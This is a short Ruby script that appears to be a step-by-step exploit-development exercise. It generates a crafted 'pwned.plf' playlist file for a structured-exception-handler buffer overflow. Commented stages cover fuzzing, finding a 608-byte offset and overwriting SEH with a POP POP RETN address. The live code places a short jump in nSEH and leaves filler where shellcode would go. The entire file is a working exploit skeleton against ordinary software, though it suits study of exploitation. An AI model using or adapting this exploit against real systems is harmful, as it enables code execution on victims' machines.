#/usr/bin/env ruby

filename = "pwned.plf"

# fist thing to do
# buffer = "\x41" * 2000 

# Find the offset for SEH
# buffer = ""

# # check if offset is corret
# buffer = "\x41" * 608
# buffer += "\x42" * 4 #nSEH
# buffer += "\x43" * 4 #SEH
# buffer += "\x44" * (2000 - (buffer.size))

# # Put change SEH to Memory Address 0x61617619 (POP POP RETN intructions)
# buffer = "\x41" * 608
# buffer += "\x42" * 4 #nSEH
# buffer +=  "\x19\x76\x61\x61" #SEH
# buffer += "\x44" * (2000 - (buffer.size))

# We need to jump forward at least 6-bytes and put opcode on nSEH
buffer = "\x41" * 608
buffer +=  "\xEB\x06\x90\x90"  #nSEH
buffer +=  "\x19\x76\x61\x61" #SEH
buffer += "\x44" * (2000 - (buffer.size))


File.open(filename, 'w') {|f| f.write(buffer)}
puts "Thle file #{filename} was created with #{buffer.size} bytes"